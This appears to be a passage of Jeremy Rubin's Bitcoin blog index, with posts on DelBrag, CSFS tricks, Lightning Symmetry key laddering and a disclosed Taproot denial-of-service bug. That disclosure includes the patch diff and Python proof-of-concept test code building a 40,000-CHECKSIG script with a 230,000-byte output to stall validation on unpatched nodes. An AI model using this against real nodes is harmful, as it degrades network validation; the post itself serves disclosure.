<!DOCTYPE html>
<html lang="en-us">
    <head>
  <title> Blog &middot; Jeremy Rubin </title>
  <link href="https://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">


  <!-- CSS -->
  <link rel="stylesheet" href="/public/css/poole.css">
  <link rel="stylesheet" href="/public/css/syntax.css">
  <link rel="stylesheet" href="/public/css/hyde.css">
  <link rel="stylesheet" href="/public/font-awesome-4.5.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
  <script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/public/apple-touch-icon-144-precomposed.png">
                                 <link rel="shortcut icon" href="/public/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">

  
  <link type="application/atom+xml" rel="alternate" href="http://rubin.io/feed.xml" title="Jeremy Rubin" />


  <!-- GA -->
<script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
    ga('create', 'UA-40376251-1', 'auto');
    ga('send', 'pageview');
</script>

  
  <link rel="me" href="https://twitter.com/JeremyRubin" >
  <meta name="twitter:dnt" content="on">
			   <script>window.twttr = (function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0],
    t = window.twttr || {};
  if (d.getElementById(id)) return t;
  js = d.createElement(s);
  js.id = id;
  js.src = "https://platform.twitter.com/widgets.js";
  fjs.parentNode.insertBefore(js, fjs);

  t._e = [];
  t.ready = function(f) {
    t._e.push(f);
  };

  return t;
}(document, "script", "twitter-wjs"));</script>

</head>

    <body>
        <div class="sidebar">
    <h3 style="text-align: center;"> <a href="/"> Jeremy Rubin </a> </h3>
    <div class="container">
        <div class="sidebar-about">

            <div class="sidebar-about-info"> 
                <a href="/public/pdfs/resume.pdf"><i class="fa fa-file-text-o" title=Resume></i></a>
                <a href=""><i class="fa fa-github" title=Github></i></a>
                <a href="https://twitter.com/JeremyRubin"><i class="fa fa-twitter" title=Twitter></i></a>
            </div>
            <div class="sidebar-about-info hide-large">
                <a class="" href="/">Home</a>
                <a class="" href="/blog/">Blog</a>
                <a class="" href="/talks/">Talks</a> 
                <a class="" href="/projects/">Projects</a>
                <a class="" href="/archive/">Site Index</a>
            </div>
        </div>




        <nav class="sidebar-nav hide-small">
            <a class="sidebar-nav-item" href="/">Home</a>
            <a class="sidebar-nav-item" href="/blog/">Blog</a>
            <a class="sidebar-nav-item" href="/talks/">Talks</a> 
            <a class="sidebar-nav-item" href="/projects/">Projects</a>
            <a class="sidebar-nav-item" href="/archive/">Site Index</a>
        </nav>
    </div>
</div>



        <div class="content container" style="padding-bottom:0;">
            <div class="page">
    
    
    <h1>
  Jeremy Rubin's Blog
</h1>

Here you'll find an assorted mix of content from yours truly. I post about a lot
of things, but primarily <a href="/bitcoin/">Bitcoin</a>.

<p>
categories: <a href="/bitcoin/">Bitcoin</a>, <a href="/shenzhen/">Shenzhen Journey</a>.
</p>
<div class="posts">
  
<hr>
  <div class="post">
    <h2 class="post-title">
        <a href="/bitcoin/2025/05/04/delbrag-talk/">
        Grokking DelBrag: Out-of-Band On-Chain Fraud Proofs through Circuit Garbling @ Bitcoin++ Austin
      </a>
  </h2>
  


    <span class="post-date">04 May 2025</span>

    <p>My talk at Bitcoin++ on how DelBrag protocols work, including detailed schematics and timing analysis.</p>

<p>Also introduces new concepts of optimistic circuit consistency checks.</p>

<p><a href="/public/pdfs/delbrag-talk-btcpp-austin-2025.pdf">Get the Slides Here</a></p>

  </div>
<hr>
  
<hr>
  <div class="post">
    <h2 class="post-title">
        <a href="/bitcoin/2025/04/04/delbrag/">
        Delbrag
      </a>
  </h2>
  


    <span class="post-date">04 Apr 2025</span>

    <p>Delbrag is a paper explaining how garbled circuits can be applied to make BitVM style constructs fraud proofs substantially more efficient, at the cost of increased out-of-band information exchange.</p>

<p>Delbrag was originally authored in November, 2024, but wasn’t published sooner as the author procrastinated.</p>

<p><a href="/public/pdfs/delbrag.pdf">Read the full paper.</a></p>

  </div>
<hr>
  
<hr>
  <div class="post">
    <h2 class="post-title">
        <a href="/bitcoin/2025/03/11/core-vuln-taproot-dos/">
        Taproot Denial of Service Bug
      </a>
  </h2>
  


    <span class="post-date">11 Mar 2025</span>

    <p>TL;DR: Taproot’s sighash implementation could cause blocks to take 60s or more to validate with specially crafted standard transactions. The patch adds a new cache during validation.</p>

<table>
  <thead>
    <tr>
      <th> </th>
      <th> </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>patch:</td>
      <td>https://github.com/bitcoin/bitcoin/pull/24105</td>
    </tr>
    <tr>
      <td>Patched:</td>
      <td>24.x, 23.x.</td>
    </tr>
    <tr>
      <td>Unpatched:</td>
      <td>22.x</td>
    </tr>
  </tbody>
</table>

<p>I discovered this vulnerability while addressing feedback on BIP-119 (CTV) regarding its denial of service risk mitigations.</p>

<p>During the comparison of BIPs’ text on DoS mitigations, I identified this vulnerability in the core’s Taproot implementation, made a proof of concept exploit, and patched it.</p>

<p>Special thanks to the reviewers and security maintainers of Bitcoin Core for assisting in resolving this issue.</p>

<h1 id="exploit-explanation--fix">Exploit Explanation &amp; Fix</h1>

<p>The below code fragment is the core of the fix.</p>

<p>Before the patch, the <code class="language-plaintext highlighter-rouge">sha_single_output</code> is computed on the fly during script evaluation, potentially. Because it is not cached, it could potentially get re-hashed multiple times.</p>

<p>After the patch, it is cached after the first evaluation (Cache on First Use).</p>

<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff --git a/src/script/interpreter.cpp b/src/script/interpreter.cpp
index 95ffe40a74..07b44971b7 100644
</span><span class="gd">--- a/src/script/interpreter.cpp
</span><span class="gi">+++ b/src/script/interpreter.cpp
</span><span class="p">@@ -1568,9 +1568,12 @@</span> bool SignatureHashSchnorr(uint256&amp; hash_out, const ScriptExecutionData&amp; execdata
     // Data about the output (if only one).
     if (output_type == SIGHASH_SINGLE) {
         if (in_pos &gt;= tx_to.vout.size()) return false;
<span class="gd">-        CHashWriter sha_single_output(SER_GETHASH, 0);
-        sha_single_output &lt;&lt; tx_to.vout[in_pos];
-        ss &lt;&lt; sha_single_output.GetSHA256();
</span><span class="gi">+        if (!execdata.m_output_hash) {
+            CHashWriter sha_single_output(SER_GETHASH, 0);
+            sha_single_output &lt;&lt; tx_to.vout[in_pos];
+            execdata.m_output_hash = sha_single_output.GetSHA256();
+        }
+        ss &lt;&lt; execdata.m_output_hash.value();
</span>     }
</code></pre></div></div>

<p>What could go wrong? Well, suppose I have a transaction that calls CHECKSIG with SIGHASH_SINGLE N times, and the corresponding SIGHASH_SINGLE output is length M. We can trigger <code class="language-plaintext highlighter-rouge">O(M*N)</code> quadratic hashing.</p>

<p>The below code can be put into the feature_taproot test, along with a few other tweaks, to test this behavior. It makes a script with <code class="language-plaintext highlighter-rouge">40000</code> CHECKSIGS that each have to hash <code class="language-plaintext highlighter-rouge">230,000</code> bytes. I think this was the largest size / repetition count I could figure out, and it took about 60s on an M1 Mac to validate.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">spenders_taproot_active</span><span class="p">():</span>
    <span class="s">"""Return a list of Spenders for testing post-Taproot activation behavior."""</span>
    <span class="n">secs</span> <span class="o">=</span> <span class="p">[</span><span class="n">generate_privkey</span><span class="p">()</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">)]</span>
    <span class="n">pubs</span> <span class="o">=</span> <span class="p">[</span><span class="n">compute_xonly_pubkey</span><span class="p">(</span><span class="n">sec</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="k">for</span> <span class="n">sec</span> <span class="ow">in</span> <span class="n">secs</span><span class="p">]</span>

    <span class="n">spenders</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="c1"># Expensive -- Pile up N CHECKSIGs, minding WU for 
</span>    <span class="c1"># sigops constraints
</span>    <span class="n">N</span> <span class="o">=</span> <span class="mi">40000</span>
    <span class="n">scripts</span> <span class="o">=</span> <span class="p">[(</span><span class="s">"exp"</span><span class="p">,</span> <span class="n">CScript</span><span class="p">([</span><span class="sa">b</span><span class="s">"0"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="n">OP_DROP</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="sa">b</span><span class="s">"0"</span><span class="o">*</span><span class="mi">13</span><span class="p">,</span> <span class="n">OP_DROP</span><span class="p">]</span><span class="o">*</span><span class="p">(</span><span class="n">N</span><span class="o">-</span><span class="mi">11</span><span class="p">)</span> <span class="o">+</span> <span class="p">[</span><span class="n">OP_DUP</span><span class="p">,</span> <span class="n">pubs</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">OP_CHECKSIGVERIFY</span><span class="p">]</span><span class="o">*</span><span class="p">(</span><span class="n">N</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="p">[</span><span class="n">pubs</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">OP_CHECKSIG</span><span class="p">]))]</span>
    <span class="n">tap</span> <span class="o">=</span> <span class="n">taproot_construct</span><span class="p">(</span><span class="n">pubs</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">scripts</span><span class="p">)</span>
    <span class="n">add_spender</span><span class="p">(</span><span class="n">spenders</span><span class="p">,</span> <span class="s">"exp"</span><span class="p">,</span> <span class="n">tap</span><span class="o">=</span><span class="n">tap</span><span class="p">,</span> <span class="n">leaf</span><span class="o">=</span><span class="s">"exp"</span><span class="p">,</span> <span class="n">standard</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">hashtype</span><span class="o">=</span><span class="n">SIGHASH_SINGLE</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="n">secs</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">**</span><span class="n">SINGLE_SIG</span><span class="p">,</span> <span class="n">failure</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">spenders</span>


<span class="k">def</span> <span class="nf">big_output</span><span class="p">(</span><span class="n">tx</span><span class="p">):</span>
    <span class="c1"># Add 1 Big Output with 0 bytes
</span>    <span class="n">tx</span><span class="p">.</span><span class="n">vout</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">CTxOut</span><span class="p">())</span>
    <span class="n">tx</span><span class="p">.</span><span class="n">vout</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">nValue</span> <span class="o">=</span> <span class="n">in_value</span>
    <span class="n">in_value</span> <span class="o">-=</span> <span class="n">tx</span><span class="p">.</span><span class="n">vout</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">nValue</span>
    <span class="n">tx</span><span class="p">.</span><span class="n">vout</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">scriptPubKey</span> <span class="o">=</span> <span class="n">CScript</span><span class="p">([</span><span class="sa">b</span><span class="s">"0"</span><span class="p">]</span><span class="o">*</span><span class="mi">230000</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">tx</span>
    
</code></pre></div></div>

<p>There are variants of this attack that can rely on standard transactions as well, but the caching should eliminate all potential concern with SIGHASH_SINGLE.</p>

  </div>
<hr>
  
<hr>
  <div class="post">
    <h2 class="post-title">
        <a href="/bitcoin/2025/03/05/csfs-fun/">
        Fun with CSFS I
      </a>
  </h2>
  


    <span class="post-date">05 Mar 2025</span>

    <p>In this blog series, I’ll write up some fun uses for CSFS I’m aware of.</p>

<p>The purpose is to document things that others might not know about.</p>

<p>Did I invent these? Maybe. Maybe not. Citations to prior work welcome!</p>

<h1 id="irreplacable-irreusable-addresses">Irreplacable Irreusable Addresses</h1>

<p>You create a taproot that is a NUMS keypath (the NUMS keypath and single tapleaf is so that you learn all the spending info always), and a tapleaf that says either a <code class="language-plaintext highlighter-rouge">&lt;PK&gt; CHECKSIG</code>, or a proof that there were &gt;1 signatures produced by that key of any data that are distinct from one another and then either:</p>

<ul>
  <li>with CTV it can be sent to OP_RETURN, or;</li>
  <li>without CTV it is anyonecanspend</li>
</ul>

<p>This means that as soon as you see a signature of a txn with this address, you know that there is no other txn that can be issued without harming the sender by making their funds burnable.</p>

<p>for extra fun:</p>

<p>The “equivocation bond” can be also in a different output, different address, to secure addresses with fresh collateral, even <em>retroactively</em>.</p>

<h1 id="function-lookup-table-precompiles">Function Lookup Table Precompiles</h1>
<p>Suppose we want to add an opcode to Bitcoin that evaluates <code class="language-plaintext highlighter-rouge">f(x)</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>let X = musig(big one time setup federation).

let CSFS(key, sig, data) = ...
</code></pre></div></div>

<p>Recall <a href="/bitcoin/2024/12/02/csfs-ctv-rekey-symmetry/">key laddering</a>…
make a script with the following logic, via laddering:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CSFS(X, sig_x, sig_arg)
CSFS(Tweaked(X, arg), sig_arg, arg)
CSFS(Tweaked(X, arg), sig_f, f(arg)))
sig_f != sig_arg
</code></pre></div></div>

<p>now run (in signing committee) f(arg) over all values of arg.</p>

<p>you now get a lookup table that can be used in any script for an arbitrary sized tree for a constant cost of 3 sigs and 2 keys ==&gt; 256 bytes, which is cheaper than using taproot pre-generated trees in many cases.</p>

<p>This technique can be modified to also work for multiple arguments, as long as the result can be precomputed. That rules out “big output spaces” like OP_CAT, but rules in lookup tables like e.g. merkle trees.</p>

<p>And for use cases where, e.g., a merkle tree would be signed by a key anyways, this is trust wise equivalent. E.g., a tree of user balances can be done in this fashion, and any user can “look up” their balance from the signature set.</p>

<p>For “standard library” type uses, big federations can be used for a one-time-trusted-setup.</p>

<h1 id="sighash-flag-detection">SIGHASH Flag Detection</h1>

<p>Presently, bitcoin scripts cannot restrict which sighash flags are used. CSFS enables a limited version of this in Taproot outoputs. Here’s how:</p>

<p>You can use CSFS to get the tx digest onto the stack from a signature.</p>

<p>without op_cat, this is of limited use…</p>

<p>however, we have the following formula:</p>

<p>^ What is the output length of SigMsg()? The total length of SigMsg() can be computed using the following formula: 174 - is_anyonecanpay * 49 - is_none * 32 + has_annex * 32</p>

<p>which is at most 206 bytes (when has_annex is set).</p>

<p><em>N.B. This number ends up being + 1 byte sighash epoch, + 64 bytes for the tag in taggedhash.</em></p>

<p>this means that using CSFS, you can restrict a signature to use some particular sighash flags, by using OP_SIZE.</p>

<p>is_anyonecanpay=0, is_none=0, has_annex=0, size=174+65
is_anyonecanpay=0, is_none=0, has_annex=1, size=206+65
is_anyonecanpay=0, is_none=1, has_annex=0, size=142+65
is_anyonecanpay=0, is_none=1, has_annex=1, size=174+65
is_anyonecanpay=1, is_none=0, has_annex=0, size=125+65
is_anyonecanpay=1, is_none=0, has_annex=1, size=157+65
is_anyonecanpay=1, is_none=1, has_annex=0, size=93+65
is_anyonecanpay=1, is_none=1, has_annex=1, size=125+65</p>

<p>this means you can use CSFS to differentiate flag combos with anyonecanpay and none and annex, except for when is_none + has_annex are both set or unset.</p>

<p>alas, this means you should probably only be interested in the following ability:</p>

<p>is_anyonecanpay=0, is_none=1, has_annex=0, size=142+65
is_anyonecanpay=1, is_none=1, has_annex=0, size=93+65</p>

<p>and less interested but still interested in these, given the annex isn’t standard:</p>

<p>is_anyonecanpay=0, is_none=0, has_annex=1, size=206+65
is_anyonecanpay=1, is_none=0, has_annex=1, size=157+65</p>

<p>note: the other flags can still be set given these ones!</p>

  </div>
<hr>
  
<hr>
  <div class="post">
    <h2 class="post-title">
        <a href="/bitcoin/2024/12/02/csfs-ctv-rekey-symmetry/">
        CSFS Re-Keying and Laddering, Deterministic Update Rekeying, & Applications to LN-Symmetry
      </a>
  </h2>
  


    <span class="post-date">02 Dec 2024</span>

    <p><em>This is a collab post with <a href="https://twitter.com/reardencode">Rearden</a>.</em></p>

<p>At Bitcoin++ in Austin this year Rearden showed that there are many ways
to realize Lightning Symmetry using various bitcoin upgrade proposals. All of
these methods require either an extra signing round-trip for each channel
update, or the ability to force the hash of the settlement transaction to be
visible with its corresponding update transaction. This can be generalized as
the requirement that the signature authorizing a given channel be both
rebindable (i.e. not commit to a specific prior UTXO) and commit to some
additional data being visible for that signature to be valid.</p>

<p>We’ll start by exploring why Lightning Symmetry requires this data visibility
commitment, then dive into previously known solutions, and present a new
generalized technique for using CSFS to two or more variables. Finally, we will
present an optimized solution based on the principles we’ve developed to enable
Lightning Symmetry using one extra signature, but no extra signing round-trip
and without the need for concatenation or other explicit multi-commitments.</p>

<h2 id="less-common-definitions">Less Common Definitions</h2>

<ul>
  <li><code class="language-plaintext highlighter-rouge">APO</code>: <code class="language-plaintext highlighter-rouge">SIGHASH_ANYPREVOUT</code> as defined in <a href="https://github.com/bitcoin/bips/blob/master/bip-0118.mediawiki">BIP118</a></li>
  <li><code class="language-plaintext highlighter-rouge">IKEY</code>: <code class="language-plaintext highlighter-rouge">OP_INTERNALKEY</code> as defined in <a href="https://github.com/bitcoin/bips/blob/master/bip-0349.md">BIP349</a></li>
  <li><code class="language-plaintext highlighter-rouge">CSFS</code>: <code class="language-plaintext highlighter-rouge">OP_CHECKSIGFROMSTACK</code> as defined in <a href="https://github.com/bitcoin/bips/pull/1535">BIP348</a></li>
  <li><code class="language-plaintext highlighter-rouge">S</code>: <code class="language-plaintext highlighter-rouge">500,000,000</code> the lock time threshold <a href="https://github.com/bitcoin/bitcoin/blob/master/src/script/script.h#L47">defined in bitcoin</a></li>
</ul>

<h2 id="naive-ctv-csfs-lightning-symmetry-transactions">Naive CTV-CSFS Lightning Symmetry transactions</h2>

<p>The scripts for a naive Taproot Lightning Symmetry channel are:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>channel:
tr(musig(keyA, keyB), raw(CTV IKEY CSFS VERIFY &lt;S+1&gt; CLTV))
update(n):
tr(musig(keyA, keyB), raw(DEPTH NOTIF &lt;settlement-n-hash&gt; CTV ELSE CTV IKEY CSFS VERIFY &lt;S+n+1&gt; CLTV ENDIF))
update-stack:
&lt;update-n-sig&gt; &lt;update-n-hash&gt;
</code></pre></div></div>

<p>If a channel enters force close, an update outpoint will be placed on chain by
A, and B will have a CSV delay encoded in the <code class="language-plaintext highlighter-rouge">settlement-n-hash</code> before it
can be settled within which to respond with a later state. One of the stated
goals of Lightning Symmetry is to eliminate the need for each partner to store
<code class="language-plaintext highlighter-rouge">O(n)</code> state for each channel, but now we hit the problem. Because the update
script is not visible on chain, while B can find the update, they cannot
reconstruct the script without the <code class="language-plaintext highlighter-rouge">settlement-n-hash</code> and only A knows that
hash unless B stores it for every state.</p>

<h2 id="apo-annex-solution">APO-annex solution</h2>

<p>In @instagibbs’ <a href="https://delvingbitcoin.org/t/ln-symmetry-project-recap/359">Lightning Symmetry
work</a>, he used APO
and the Taproot Annex where both parties to a channel will only sign an update
transaction if their signatures commit to an annex containing the
corresponding settlement hash needed to reconstruct the update spend script.</p>

<p>The scripts for this are (roughly):</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>channel:
tr(musig(keyA, keyB), raw(&lt;1&gt; CHECKSIGVERIFY &lt;S+1&gt; CLTV))
update(n):
tr(musig(keyA, keyB), raw(DEPTH NOTIF &lt;sig&gt; &lt;01||G&gt; CHECKSIG ELSE &lt;1&gt; CHECKSIGVERIFY &lt;S+n+1&gt; CLTV ENDIF))
update-stack:
&lt;update-n-sig&gt;
</code></pre></div></div>

<p>Here we see the use of APO as a covenant by precomputing a signature for the
secret key <code class="language-plaintext highlighter-rouge">1</code> and public key <code class="language-plaintext highlighter-rouge">G</code>. Because CHECKSIG operations commit to the
Taproot Annex, these scripts require no special handling for the channel
parties to require each other to place the settlement transaction hash in the
annex and therefore make it possible for either party to later reconstruct any
prior state’s script for spending. Without the annex, an APO-based
implementation would either fall back to the additional signing round-trip, or
using an <code class="language-plaintext highlighter-rouge">OP_RETURN</code> to force this data to be visible.</p>

<h2 id="naive-ctv-csfs-solution">Naive CTV-CSFS solution</h2>

<p>Can we just commit to an additional hash using an additional signature?</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>channel:
tr(musig(keyA, keyB), raw(CTV IKEY CSFS VERIFY IKEY CSFS VERIFY &lt;S+1&gt; CLTV))
update(n):
tr(musig(keyA, keyB), raw(DEPTH NOTIF &lt;settlement-n-hash&gt; CTV ELSE CTV IKEY CSFS VERIFY IKEY CSFS VERIFY &lt;S+n+1&gt; CLTV ENDIF))
update-stack:
&lt;settlement-n-sig&gt; &lt;settlement-n-hash&gt; &lt;update-n-sig&gt; &lt;update-n-hash&gt;
</code></pre></div></div>

<p>This method is broken because the two signatures are not linked in any way. A
malicious channel partner can place a mismatched settlement hash, and update
transaction on chain, preventing their partner who has a valid later update
from reconstructing the scripts and updating the channel state.</p>

<p>One obvious solution would be to combine the update hash and the settlement
hash, but since bitcoin lacks a concatenation operator, we cannot do that.
Recently <a href="https://x.com/4moonsettler">@4moonsettler</a> proposed
<a href="https://github.com/bitcoin/bips/pull/1699"><code class="language-plaintext highlighter-rouge">OP_PAIRCOMMIT</code></a> as an alternative
for this purpose.</p>

<h2 id="ctv-csfs-delegation-solution">CTV-CSFS delegation solution</h2>

<p>Now we come to the new solution that we’ve developed, which ties the update
and settlement hashes together by the keys which have signed them. CSFS is
known to be useful for delegation, so we initially delegate to a rekey:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script(n):
    DUP TOALT DUP TOALT
    IKEY CSFS VERIFY
    OP_SIZE &lt;32&gt; EQUALVERIFY CTV
    2DUP EQUAL NOT VERIFY
    ROT SWAP FROMALT CSFS VERIFY
    FROMALT CSFS VERIFY &lt;S+n+1&gt; CLTV
channel:
    tr(musig(keyA, keyB), raw(&lt;script(0)&gt;))
update(n):
    tr(musig(keyA, keyB),
        raw(DEPTH NOTIF &lt;settlement-n-hash&gt; CTV ELSE &lt;script(n)&gt; ENDIF))
stack(n):
    &lt;settlement-n-sig&gt;
    &lt;update-n-sig&gt;
    &lt;settlement-extradata&gt;
    &lt;update-n-ctv&gt;
    &lt;rekey-sig&gt;
    &lt;rekey&gt;
</code></pre></div></div>

<p>Here the <code class="language-plaintext highlighter-rouge">rekey</code> is an ephemeral key either randomly generated or derived
for each state using something like BIP32 and based on the channel key. What
matters is that the <code class="language-plaintext highlighter-rouge">rekey</code> is never used to sign anything other than the two
messages corresponding to the update and settlement hashes for its state. In
this way they are only valid together and the correct settlement hash must be
available for a channel partner to reconstruct the scripts and update the
channel settlement. One quirk of this solution is that if the two signed items
are allowed to be equal, a malicious partner can simply place the same update
hash on the stack with its signature twice, so they must be checked for
inequality by the script.</p>

<p>This scheme is secure  because of the length check for the arg <code class="language-plaintext highlighter-rouge">update-n-ctv</code>,
it should be ensured that the other <code class="language-plaintext highlighter-rouge">&lt;settlement-extradata&gt;</code> is either not a
valid CTV hash or is not length 32.</p>

<h2 id="csfs-key-laddering">CSFS Key Laddering</h2>
<p>Key Laddering extends the rekeying approach shown above to allow recursively
rekeying to an arbitrary number of variables. This allows CSFS to be used without
OP_CAT to sign over collections of variables to be plugged into a script.</p>

<p>For example, for 5 variables (not optimized, written for clarity):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DATASIGS: &lt;sd1&gt; &lt;d1&gt; &lt;sd2&gt; &lt;d2&gt; &lt;sd3&gt; &lt;d3&gt; &lt;sd4&gt; &lt;d4&gt; &lt;sd5&gt; &lt;d5&gt;
stack: DATASIGS + &lt;k5&gt; &lt;s5&gt; &lt;k4&gt; &lt;s4&gt; &lt;k3&gt; &lt;s3&gt; &lt;k2&gt; &lt;s2&gt; &lt;k1&gt; &lt;s1&gt;

program:

\\ First, check that k1 is signed by IKEY
    OVER IKEY CSFSV
    DUP TOALT

// Next, Check that k_i signs k_{i+1}
    // stack: DATASIGS + &lt;k5&gt; &lt;s5&gt; &lt;k4&gt; &lt;s4&gt; &lt;k3&gt; &lt;s3&gt; &lt;k2&gt; &lt;s2&gt; &lt;k1&gt;
    // altstack: &lt;k1&gt;

        3DUP ROT SWAP CSFSV 2DROP DUP TOALT

    // stack: DATASIGS + &lt;k5&gt; &lt;s5&gt; &lt;k4&gt; &lt;s4&gt; &lt;k3&gt; &lt;s3&gt; &lt;k2&gt;
    // altstack: &lt;k1&gt; &lt;k2&gt;

        3DUP ROT SWAP CSFSV 2DROP DUP TOALT

    // stack: DATASIGS + &lt;k5&gt; &lt;s5&gt; &lt;k4&gt; &lt;s4&gt; &lt;k3&gt;
    // altstack: &lt;k1&gt; &lt;k2&gt; &lt;k3&gt;

        3DUP ROT SWAP CSFSV 2DROP DUP TOALT

    // stack: DATASIGS + &lt;k5&gt; &lt;s5&gt; &lt;k4&gt;
    // altstack: &lt;k1&gt; &lt;k2&gt; &lt;k3&gt; &lt;k4&gt;

        3DUP ROT SWAP CSFSV 2DROP

    // stack: &lt;sd1&gt; &lt;d1&gt; &lt;sd2&gt; &lt;d2&gt; &lt;sd3&gt; &lt;d3&gt; &lt;sd4&gt; &lt;d4&gt; &lt;sd5&gt; &lt;d5&gt; &lt;k5&gt;
    // altstack: &lt;k1&gt; &lt;k2&gt; &lt;k3&gt; &lt;k4&gt;


        FROMALT FROMALT FROMALT FROMALT

    // stack: &lt;sd1&gt; &lt;d1&gt; &lt;sd2&gt; &lt;d2&gt; &lt;sd3&gt; &lt;d3&gt; &lt;sd4&gt; &lt;d4&gt; &lt;sd5&gt; &lt;d5&gt; &lt;k5&gt; &lt;k4&gt; &lt;k3&gt; &lt;k2&gt; &lt;k1&gt;
    // altstack:

// Now, check each signature of the data

    &lt;6&gt; PICK // sd5
    &lt;6&gt; PICK // d5
    &lt;6&gt; PICK // k5
    CSFSV

    &lt;8&gt; PICK // sd4
    &lt;8&gt; PICK // d4
    &lt;5&gt; PICK // k4
    CSFSV

    &lt;10&gt; PICK // sd3
    &lt;10&gt; PICK // d3
    &lt;4&gt; PICK // k3
    CSFSV

    &lt;12&gt; PICK // sd2
    &lt;12&gt; PICK // d2
    &lt;3&gt; PICK // k2
    CSFSV

    &lt;14&gt; PICK // sd1
    &lt;14&gt; PICK // d1
    &lt;2&gt; PICK // k1
    CSFSV

// Now, Check the inequalities that no key is used as data:
    // stack: &lt;sd1&gt; &lt;d1&gt; &lt;sd2&gt; &lt;d2&gt; &lt;sd3&gt; &lt;d3&gt; &lt;sd4&gt; &lt;d4&gt; &lt;sd5&gt; &lt;d5&gt; &lt;k5&gt; &lt;k4&gt; &lt;k3&gt; &lt;k2&gt; &lt;k1&gt;
    // altstack:

    // No need to check k1 != d0 since no d0

    // Check that k2 != d1
    &lt;1&gt; PICK
    &lt;14&gt; PICK
    NOT EQUAL VERIFY

    // Check that k3 != d2
    &lt;2&gt; PICK
    &lt;12&gt; PICK
    NOT EQUAL VERIFY


    // Check that k4 != d3
    &lt;3&gt; PICK
    &lt;8&gt; PICK
    NOT EQUAL VERIFY

    // check that k5 != d4
    &lt;4&gt; PICK
    &lt;6&gt; PICK
    NOT EQUAL VERIFY


// stack: &lt;sd1&gt; &lt;d1&gt; &lt;sd2&gt; &lt;d2&gt; &lt;sd3&gt; &lt;d3&gt; &lt;sd4&gt; &lt;d4&gt; &lt;sd5&gt; &lt;d5&gt; &lt;k5&gt; &lt;k4&gt; &lt;k3&gt; &lt;k2&gt; &lt;k1&gt;
// altstack:

2DROP 2DROP DROP
TOALT DROP
TOALT DROP
TOALT DROP
TOALT DROP
TOALT DROP

// stack:
// altstack: &lt;d5&gt; &lt;d4&gt; &lt;d3&gt; &lt;d2&gt; &lt;d1&gt;

// Whatever else


</code></pre></div></div>
<p>This lets you sign an arbitrary number of variables in a sequence.</p>

<p>One “gotcha” not shown in the above script is there is a need to ensure the signature over data and signatures over keys are not exchangable at each hop.
Care should be taken to ensure this.</p>

<p>One alternative scheme is to do “signature laddering”. That is, instead of signing a key at each step, sign instead the next signature.</p>

<p>E.g., re-key by signing with IKEY the first signature. Then verify it against any key / message pair it will validate against. The key can be used with a different signature for the value, and the message signed is the next signature. E.g.:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stack:
&lt;sig B&gt;
&lt;key A&gt;
&lt;sig^IKEY(sig A)&gt;
&lt;sig^A(sig B)&gt;

DUP TOALT
IKEY CSFS VERIFY
FROMALT

stack:
&lt;sig B&gt;
&lt;key A&gt;
&lt;sig^A(sig B)&gt;

ROT ROT CSFS VERIFY

</code></pre></div></div>

<p>This laddering is convenient, because the first IKEY sig commits to the roles of
all the other data (key v.s. sig v.s. argument).</p>

<h2 id="ctv-csfs-with-derived-internal-keys-solution">CTV-CSFS with derived internal keys solution</h2>

<p>For Lightning Symmetry, each update transaction is signed with a specific
monotonically increasing locktime, and nothing requires the internal key to be
exactly the same for each update, so we can replace the internal key with a
